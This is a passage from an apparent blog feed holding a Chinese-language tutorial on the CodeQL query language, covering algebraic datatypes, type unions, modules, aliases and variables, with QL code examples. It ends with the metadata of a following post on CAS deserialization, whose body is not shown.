class="line">代数数据类型的语法还在测试阶段，虽然可以现在的QL程序中使用它们，但以后可能会发生变化。下面是一些注意事项和例子。</span><br></pre></td></tr></table></figure><p> 代数数据类型是用户自定义类型的一种，用关键字<code>newtype</code>声明。<br> 代数数据类型用来创建既不是原始值也不是数据库实体中的新值。例如，在分析程序时，对数据流节点进行建模。<br> 代数数据类型由数个不相交的 <em>分支</em> 组成，代数数据类型是这些分支的并集。其中分支由参数和主体组成，对于满足参数和主体的每组值，都会产生一个新的分支类型的值。<br> 这样可以使每个分支可以具有不同的结构。例如，如果想定义一个”选项类型”来保存一个值（例如<code>Call()</code>或者空），则可以采用下述写法：<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">newtype</span> <span class="variable">OptionCall</span> <span class="operator">=</span> SomeCall(Call c) or <span class="title function_">NoCall</span><span class="params">()</span></span><br></pre></td></tr></table></figure><br>这意味着对于程序中的每一个<code>Call</code>，都会产生一个<code>SomeCall</code>值，也会产生另外一个独立的<code>Nocall</code>值。</p><h3 id="代数数据类型的定义（Defining-an-algebraic-datatypes）"><a href="#代数数据类型的定义（Defining-an-algebraic-datatypes）" class="headerlink" title="代数数据类型的定义（Defining an algebraic datatypes）"></a>代数数据类型的定义（Defining an algebraic datatypes）</h3><p>代数数据类型语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newtype &lt;TypeName&gt; = &lt;branches&gt;</span><br></pre></td></tr></table></figure><p>分支语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BranchesName&gt; = (&lt;arguments&gt;)(&lt;body&gt;)</span><br></pre></td></tr></table></figure><ul><li>类型名称和分支名称必须以大写字母开头，一般而言，以T开头。</li><li>代数数据类型的不同分支之间用or连接。</li><li>当分支的参数大于1个时，用”,”分割。</li><li>分支的主体和谓词的主体相同。在一个分支没有主体的情形下，它的主体默认为<code>any()</code>。主要注意，分支主体会在程序中全部运行，所以它们必须是有限值，保持小而精的方式。<br>例如：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">newtype</span> <span class="variable">T</span> <span class="operator">=</span> </span><br><span class="line">    Type1 (A a, B b)&#123;body(a,b)&#125;</span><br><span class="line">    or</span><br><span class="line">    <span class="title function_">Type2</span> <span class="params">(C c)</span></span><br><span class="line">    or</span><br><span class="line">    <span class="title function_">Type3</span> <span class="params">()</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="使用代数数据类型的标准模式（Standard-pattern-for-using-algebraic-datatypes）"><a href="#使用代数数据类型的标准模式（Standard-pattern-for-using-algebraic-datatypes）" class="headerlink" title="使用代数数据类型的标准模式（Standard pattern for using algebraic datatypes）"></a>使用代数数据类型的标准模式（Standard pattern for using algebraic datatypes）</h3><p>代数数据类型和类不同，不包含成员谓词<code>toString()</code>，所以不能在<code>select</code>子句中使用。<br>类可以用来拓展代数数据类型（并提供<code>toString()</code>类型），在标准QL语言库中，经常使用以下定义方式：</p><ul><li>定义一个类A来拓展代数数据类型，并选择性的声明抽象谓词（abstract predicates）。</li><li>对每个分支类型，定义一个同时拓展类A和分支类型的类B，并重写类A中的所有抽象谓词。</li><li>代数数据类型用<code>private</code>修饰，而类是公开访问的。<br>例如：C#的CodeQl数据流库中的一下代码定义了用于处理有污染或无污染的类。在这种情况下，<code>TaintType</code>拓展数据库类型没有任何意义。它是污点分析的一部分，并不是基础程序，所以它拓展一个新类型（<code>TTaintType</code>）是十分有用的。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">newtype</span> <span class="variable">TTaintType</span> <span class="operator">=</span></span><br><span class="line">  TExactValue()</span><br><span class="line">  or</span><br><span class="line">  <span class="title function_">TTaintedValue</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Describes how data is tainted. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaintType</span> <span class="keyword">extends</span> <span class="title class_">TTaintType</span> &#123;</span><br><span class="line">  string <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span> = TExactValue() <span class="type">and</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;exact&quot;</span></span><br><span class="line">    <span class="type">or</span></span><br><span class="line">    <span class="variable">this</span> <span class="operator">=</span> TTaintedValue() <span class="type">and</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;tainted&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** A taint type where the data is untainted. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Untainted</span> <span class="keyword">extends</span> <span class="title class_">TaintType</span>, TExactValue &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** A taint type where the data is tainted. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tainted</span> <span class="keyword">extends</span> <span class="title class_">TaintType</span>, TTaintedValue &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="类型集合（Type-union）"><a href="#类型集合（Type-union）" class="headerlink" title="类型集合（Type union）"></a>类型集合（Type union）</h3><p>类型集合是用关键字<code>class</code>修饰的用户自定义类型，语法形式和类型别名（type aliases）相似，但在表达式的右边有两个或多个类型表达式。<br>通过显示选择分支子集，并将其绑定到一个新类型，类型集合可以用来创建代数数据类型的受限子集。数据库类型也支持类型集合。<br>用户可以使用类型集合来为代数数据类型的分支命名。在某些情况下，在整个代数数据类型上使用类型集合可以避免虚假递归调用。如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">newtype</span> <span class="variable">InitialValueSource</span> <span class="operator">=</span></span><br><span class="line">  ExplicitInitialization(VarDecl v) &#123; exists(v.getInitializer()) &#125; or</span><br><span class="line">  <span class="title function_">ParameterPassing</span><span class="params">(Call c, <span class="type">int</span> pos)</span> &#123; exists(c.getParameter(pos)) &#125; or</span><br><span class="line">  <span class="title function_">UnknownInitialGarbage</span><span class="params">(VarDecl v)</span> &#123; not <span class="title function_">exists</span><span class="params">(DefiniteInitialization di | v = target(di)</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DefiniteInitialization</span> = ParameterPassing or ExplicitInitialization;</span><br><span class="line"></span><br><span class="line">VarDecl <span class="title function_">target</span><span class="params">(DefiniteInitialization di)</span> &#123;</span><br><span class="line">  di = ExplicitInitialization(result) or</span><br><span class="line">  <span class="title function_">exists</span><span class="params">(Call c, <span class="type">int</span> pos | di = ParameterPassing(c, pos)</span> <span class="type">and</span></span><br><span class="line">                            <span class="variable">result</span> <span class="operator">=</span> c.getCallee().getFormalArg(pos))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，类似的通过限制<code>InitialValueSource</code>而定义拓展类的实现是无效的。如果将<code>DefiniteInitialization</code>改为<code>InitialValueSource</code>的类拓展则无效，这回触发<code>InitialValueSource</code>的类型测试。这回导致虚假递归：<code> DefiniteInitialization -&gt; InitialValueSource -&gt; UnknownInitialGarbage -&gt; ¬DefiniteInitialization</code>，因为<code>UnknownInitalGarbage</code>依赖于<code>DefinaiteInitalization</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// THIS WON&#x27;T WORK: The implicit type check for InitialValueSource involves an illegal recursion</span></span><br><span class="line"><span class="comment">// DefiniteInitialization -&gt; InitialValueSource -&gt; UnknownInitialGarbage -&gt; ¬DefiniteInitialization!</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DefiniteInitialization</span> <span class="keyword">extends</span> <span class="title class_">InitialValueSource</span> &#123;</span><br><span class="line">  DefiniteInitialization() &#123;</span><br><span class="line">    <span class="built_in">this</span> <span class="keyword">instanceof</span> ParameterPassing or <span class="built_in">this</span> <span class="keyword">instanceof</span> ExplicitInitialization</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库类型-（Database-Type）"><a href="#数据库类型-（Database-Type）" class="headerlink" title="数据库类型 （Database Type）"></a>数据库类型 （Database Type）</h2><p>数据库类型在数据库模式中定义，它依赖于查询的数据库，并根据要分析的数据有所不同。<br>例如分析java语言的项目，数据库类型可能包含<code>@ifstmt</code>（表示java代码中的SQL语句），<code>@variable</code>（变量）。</p><h2 id="类型兼容性（Type-compatibility）"><a href="#类型兼容性（Type-compatibility）" class="headerlink" title="类型兼容性（Type compatibility）"></a>类型兼容性（Type compatibility）</h2><p>类型之间也存在着不兼容的情形，例如，<code>4&lt;&quot;five&quot;</code>就是一种不合法的表达方式，因为<code>int</code>和<code>string</code>类型是没有办法比较的。<br>QL中的universe（类型兼容性）如下：</p><ul><li>原始类型之间互不兼容。（除了<code>int</code>和<code>float</code>，它们都属于数字类型）。</li><li>数据库类型之间互不兼容。</li><li>一个代数数据类型的不同分支之间互不兼容。<br>便于理解，附上原文：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The universes in QL are:</span><br><span class="line">  One for each primitive type (except int and float, which are in the same universe of “numbers”).</span><br><span class="line">  One for each database type.</span><br><span class="line">  One for each branch of an algebraic datatype.</span><br></pre></td></tr></table></figure>例如，当用户想定义一个类时，要考虑如下限制：</li><li>一个类不能同时拓展多个原始类型（primitive Types）。</li><li>一个类不能同时拓展多个不同的数据库类型。</li><li>一个类不能同时拓展一个代数数据类型的多个分支。</li></ul><h1 id="模块（Module）"><a href="#模块（Module）" class="headerlink" title="模块（Module）"></a>模块（Module）</h1><p>模块可以有组织的将QL代码中的类型，谓词和其他模块组合在一起。为了提高代码的复用性，用户可以将模块导入到其他文件，从而使代码模块化，更容易管理。</p><h2 id="模块的定义（Defining-a-module）"><a href="#模块的定义（Defining-a-module）" class="headerlink" title="模块的定义（Defining a module）"></a>模块的定义（Defining a module）</h2><p>有许多定义模块的方法，下面这个例子，显示的定义了一个名为<code>Example</code>的模块，它还包含一个名为<code>OneTwoThree</code>的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> Example &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123;</span><br><span class="line">      <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>模块的名称可以是任何以大写或小写字母开头的标识符。</li><li><code>.ql</code>和<code>.qll</code>文件也隐式的定义模块。<br>用户也可以注解一个模块，但只能注解显示定义的模块。</li></ul><h2 id="模块的种类（Kind-of-modules）"><a href="#模块的种类（Kind-of-modules）" class="headerlink" title="模块的种类（Kind of modules）"></a>模块的种类（Kind of modules）</h2><h3 id="文件模块（File-modules）"><a href="#文件模块（File-modules）" class="headerlink" title="文件模块（File modules）"></a>文件模块（File modules）</h3><p>每个查询文件（<code>.ql</code>）和库文件（<code>.qll</code>）都隐式的定义一个模块。模块的名称和文件的名称相同，导入模块时需要把文件名称中的空格换成下划线（<code>_</code>）。文件的内容是模块的主体。</p><h3 id="库模块（Library-modules）"><a href="#库模块（Library-modules）" class="headerlink" title="库模块（Library modules）"></a>库模块（Library modules）</h3><p>库模块是由<code>.qll</code>文件定义的，除了select子句外，它可以包含模块体内的任何内容。<br>例如，<code>OneTwoThreeLib.qll</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span>&#123;</span><br><span class="line">    OneTwoThree()&#123;</span><br><span class="line">        <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述文件定义了一个名为<code>OneTwoThreeLib</code>的库模块，模块体中定义了一个名为<code>OneTwoThree</code>的类。</p><h3 id="查询模块（Query-modules）"><a href="#查询模块（Query-modules）" class="headerlink" title="查询模块（Query modules）"></a>查询模块（Query modules）</h3><p>查询模块是由<code>ql</code>定义的，它可以包含模块体（下文介绍）中定义的任何元素。<br>查询模块和其他模块有些许的不同：</p><ul><li>查询模块不能被导入。</li><li>查询模块的命名空间内至少要有一个查询语句。查询语句可以是select子句，也可以是查询谓词。<br>例如，<code>OneTwoQuery.ql</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> OneTwoThreeLib</span><br><span class="line">from OneTwoThree ott</span><br><span class="line"><span class="type">where</span> <span class="variable">ott</span> <span class="operator">=</span> <span class="number">1</span> <span class="type">or</span> <span class="variable">ott</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">select ott</span><br></pre></td></tr></table></figure>这个文件定义了一个名为<code>OneTwoQuery</code>的查询模块，模块体包括导入声明（import statement）和select 子句。</li></ul><h3 id="显式定义模块（Explicit-modules）"><a href="#显式定义模块（Explicit-modules）" class="headerlink" title="显式定义模块（Explicit modules）"></a>显式定义模块（Explicit modules）</h3><p>用户也可以再一个模块中显式的定义另一个模块。<br>显式模块需要关键字<code>module</code>定义，模块体在<code>&#123;&#125;</code>里，显式模块不能包含select子句。<br>例如，你可以在库文件<code>OneTwoThreeLib.qll</code>中添加如下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> M&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">OneTwo</span> <span class="keyword">extends</span> <span class="title class_">OneTwoThree</span>&#123;</span><br><span class="line">        OneTwo()&#123;</span><br><span class="line">            <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码定义了一个名为<code>M</code>的模块，模块体中包含一个名为<code>OneTwo</code>的类。</p><h2 id="模块体（Module-bodies）"><a href="#模块体（Module-bodies）" class="headerlink" title="模块体（Module bodies）"></a>模块体（Module bodies）</h2><p>模块内定义的代码成为模块体，例如，显式模块<code>M</code>中的类<code>OneTwo</code>。<br>通常，模块体可以包含以下几种成分：</p><ul><li>导入语句（Import statements）</li><li>谓词（Predicates）</li><li>类型（Types，包括用户自定义的类）</li><li>别名（Aliases）</li><li>显式模块（Explicit modules）</li><li>select子句（Select clauses,仅能在查询模块中使用）</li></ul><h2 id="导入模块（Importing-modules）"><a href="#导入模块（Importing-modules）" class="headerlink" title="导入模块（Importing modules）"></a>导入模块（Importing modules）</h2><p>模块最大的作用就是用户可以在一个模块中使用另一个模块的代码。用户可以使用导入语句（import statement）在一个模块中导入另一个模块。<br>导入模块时，会将该模块命名空间中的所有名称（除了私有名称）导入到当前命名空间。</p><h3 id="导入语句（Import-statement）"><a href="#导入语句（Import-statement）" class="headerlink" title="导入语句（Import statement）"></a>导入语句（Import statement）</h3><p>导入语句的语法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &lt;module_expression1&gt; as &lt;name&gt;</span><br><span class="line"><span class="keyword">import</span> &lt;module_expression2&gt;</span><br></pre></td></tr></table></figure><p>导入语句通常在模块的开头，每个导入语句都导入一个模块。用户可以使用多个语句来导入多个模块，import语句也可以用private注解。<br>用户可以使用as关键字以其他名称导入模块，例如，<code>import javascript as js</code>。</p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>本节主要介绍QL语言中模块的概念，模块通过将类、谓词、其他模块等内容组合在一起，将数据集合在一起，从而便于查询。</p><h1 id="别名（Aliases）"><a href="#别名（Aliases）" class="headerlink" title="别名（Aliases）"></a>别名（Aliases）</h1><p>别名是现有QL实体的替代名称，定义别名后，可以使用新名称来引用当前模块命名空间中的实体。</p><h2 id="定义别名（Defining-an-alias）"><a href="#定义别名（Defining-an-alias）" class="headerlink" title="定义别名（Defining an alias）"></a>定义别名（Defining an alias）</h2><p>用户可以在任何模块的主体中定义别名，需要注意以下三点：</p><ol><li>关键字<code>module</code>,<code>class</code> 和 <code>predicate</code>分别为模块、类型和非成员谓词定义别名。</li><li>别名规范。别名应当是该实体类型的有效名称。比如，谓词的别名以小写字母开头。</li><li>QL实体的引用。需要包含实体的原名，需要保证谓词的一致性（？？？）。<br>用户也可以为别名添加注解，需要注意，对别名添加的注意仅适用于别名本身，对别名背后的实体并无影响。</li></ol><h2 id="模块别名（Module-aliases）"><a href="#模块别名（Module-aliases）" class="headerlink" title="模块别名（Module aliases）"></a>模块别名（Module aliases）</h2><p>使用下述语法给模块定义别名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">module</span> <span class="variable">ModAlias</span> <span class="operator">=</span> ModuleName;</span><br></pre></td></tr></table></figure><p>例如，如果你想要创建一个旧模块<code>OldVersion</code>的新版本<code>NewVersion</code>，则可以按照下述方式弃用旧模块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deprecated <span class="type">module</span> <span class="variable">OldVersion</span> <span class="operator">=</span> New Version;</span><br></pre></td></tr></table></figure><p>该方式使两个名称<code>OldVersion</code>和<code>NewVersion</code>指向同一个模块，但如果在代码中使用旧模块<code>OldVersion</code>，则会出现弃用警告（Deprecated warning）。</p><h2 id="类型别名（Type-aliases）"><a href="#类型别名（Type-aliases）" class="headerlink" title="类型别名（Type aliases）"></a>类型别名（Type aliases）</h2><p>使用下述语法给类型定义别名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TypeAliases</span> = TypeName;</span><br></pre></td></tr></table></figure><p>注意，<code>class</code>只是一个关键字，并不是只适用于类。用户可以为任何类型（原始类型，数据库类型或用户自定义的类）来定义别名。例如可以使用别名将基本类型<code>boolean</code>缩写为<code>bool</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">bool</span> = <span class="type">boolean</span>;</span><br></pre></td></tr></table></figure><p>或者，用户想要使用在<code>OneTwoThreeLib.qll</code>中的模块<code>M</code>中定义的<code>OneTwo</code>类，则可以使用一个较短的别名<code>OT</code>来使用该类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> OneTwoThreeLib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OT</span> = M::OneTwo;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">from OT ot</span><br><span class="line">select ot</span><br></pre></td></tr></table></figure><h2 id="谓词别名（Predicate-aliases）"><a href="#谓词别名（Predicate-aliases）" class="headerlink" title="谓词别名（Predicate aliases）"></a>谓词别名（Predicate aliases）</h2><p>只能为非成员谓词定义别名，语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">predicate</span> <span class="variable">PredAlias</span> <span class="operator">=</span> Predicate/Arity;  <span class="comment">// Arity 是参数个数。</span></span><br></pre></td></tr></table></figure><p>该方法适用于有结果或无结果的谓词。<br>假如要使用下述谓词计算小于10的正整数的后一个数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getSuccessor</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">  result = i + <span class="number">1</span> and i in [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用aliases将其名称缩写为<code>succ</code> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">predicate</span> <span class="variable">succ</span> <span class="operator">=</span> getSuccessor/<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>对于没有结果的谓词，下述谓词可以接纳小于10的任何正整数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">isSmall</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">  i in [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以给该谓词一个更具体的名称：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">preidcate</span> <span class="variable">lessThanTen</span> <span class="operator">=</span> isSmall/<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h1 id="变量（Variables）"><a href="#变量（Variables）" class="headerlink" title="变量（Variables）"></a>变量（Variables）</h1><p>QL中的变量与代数和逻辑变量的使用方式一致，它通常表示收到公式限制的一组值。<br>其他编程语言的变量可能包含数据的内存位置，该数据还可能随着时间发生变化。QL中的变量和它们不同。例如在QL中，<code>n = n + 1</code>是一个等式公式（数学上的公式），当且仅当 <code>n</code> 等于 <code>n+1</code>时才成立（实际上，该公式永远不成立）。但是，在Java中，<code>n = n + 1</code> 是一个赋值语句，通过添加1对当前的n重新赋值。</p><h2 id="声明一个变量（Declaring-a-variable）"><a href="#声明一个变量（Declaring-a-variable）" class="headerlink" title="声明一个变量（Declaring a variable）"></a>声明一个变量（Declaring a variable）</h2><p>所有变量声明均由变量的类型和名称组成，名称可以是任何以大写或小写字母开头的标识符。<br>例如：<code>int i</code>、<code>LocalScopeVariable node</code>等，该语句声明了变量<code>i,node</code>，它们的类型分别是<code>int, LocalScopeVariable</code>。变量声明出现在不同的上下文中，例如select子句、量化公式、谓词的参数等等。<br>理论上，变量可以是它所属类型的所有可能的取值，但要受到一些约束。<br>例如，考虑下面的select子句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from <span class="type">int</span> i</span><br><span class="line">where i in [<span class="number">0</span> .. <span class="number">9</span>]</span><br><span class="line">select i</span><br></pre></td></tr></table></figure><p>若仅考虑<code>i</code>的类型，它可以是int类型的所有值。然而它要受到公式<code>i in [0 .. 9]</code>的约束，所以该select子句的结果是10个数字（0，1，2，3，4，5，6，7，8，9）<br>注意，下面的语句会导致编译错误：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from <span class="type">int</span> i</span><br><span class="line">select i</span><br></pre></td></tr></table></figure><p>理论上来说，该语句的结果是无限的。</p><h2 id="自由变量和约束变量（Free-and-bount-variable）"><a href="#自由变量和约束变量（Free-and-bount-variable）" class="headerlink" title="自由变量和约束变量（Free and bount variable）"></a>自由变量和约束变量（Free and bount variable）</h2><p>自有变量：自有变量的值直接影响使用它的表达式的值，或者影响使用它的公式是否成立。<br>约束变量：仅限于特定的值集。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;hello&quot;</span>.indexof(<span class="string">&quot;l“)</span></span><br><span class="line"><span class="string">min(float f | f in [-3 .. 3])</span></span><br><span class="line"><span class="string">(i + 7) * 3</span></span><br><span class="line"><span class="string">x.sqrt()</span></span><br></pre></td></tr></table></figure><p>第一个表达式没有任何变量。它找到<code>&quot;hello&quot;</code> 中 <code>&quot;l&quot; </code>所在的索引位置，因此它的结果为2和3。<br>第二个表达式结果为-3。它找到<code>[-3 .. 3]</code>范围内的最小值 <code>-3</code> 。尽管该表达式中有变量 <code>f</code> ，但它只是一个占位符，用户不能为它分配任何值。<code>min(float f | f in [-3 .. 3])</code>和 <code>min(float other | other in [-3 .. 3])</code>效果是相同的。该变量为约束比那辆<br>第三、四个表达式中，表达式的值取决于其变量的值（<code>i</code>，<code>x</code>）。也就是变量的值对表达式的值有影响。这两个变量是自由变量。<br>类似地，如果一个表达式包含自由变量，那么该表达式是否有效（hold,成立），取决于自由变量的取值。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;hello&quot;</span>.indexof(<span class="string">&quot;l“) = 1</span></span><br><span class="line"><span class="string">min(float f | f in [-3 .. 3]) = -3</span></span><br><span class="line"><span class="string">(i + 7) * 3 instanceof int</span></span><br><span class="line"><span class="string">exists(float y | x.sqrt() = y)</span></span><br></pre></td></tr></table></figure><p>第一个表达式没有任何变量，也永远不成立（因为<code>&quot;hello&quot;.indexOf(&quot;l&quot;)</code>的值为2或3，不等于1）。<br>第二个表达式仅包含约束变量，该表达式永远成立。<br>第三个表达式包含一个自由变量<code>i</code>。仅当<code>i</code>是<code>int</code>类型的变量时成立，若<code>i</code>为其他类型的变量（3.5,float）则不成立。<br>第四个表达式包含一个私有变量<code>x</code>和一个约束变量<code>y</code>，如果<code>x</code>是一个非负的数，则表达式成立。约束变量<code>y</code>不影响表达式的成立与否。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本数据类型&quot;&gt;&lt;a href=&quot;#基本数据类型&quot; class=&quot;headerlink&quot; title=&quot;基本数据类型&quot;&gt;&lt;/a&gt;基本数据类型&lt;/h1&gt;&lt;p&gt;QL是一种强类型的语言，必须先定义变量再使用变量。&lt;/p&gt;
&lt;h2 id=&quot;整型-int&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="CodeQL" scheme="http://che35tnut.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CAS 反序列化</title>
    <link href="http://che35tnut.github.io/2021/09/02/210902-Java-CAS-Deserialization/"/>
    <id>http://che35tnut.github.io/2021/09/02/210902-Java-CAS-Deserialization/</id>
    <published>2021-09-02T07:11:38.000Z</published>
    <updated>2022-10-12T11:31:08.888Z</updated>
    
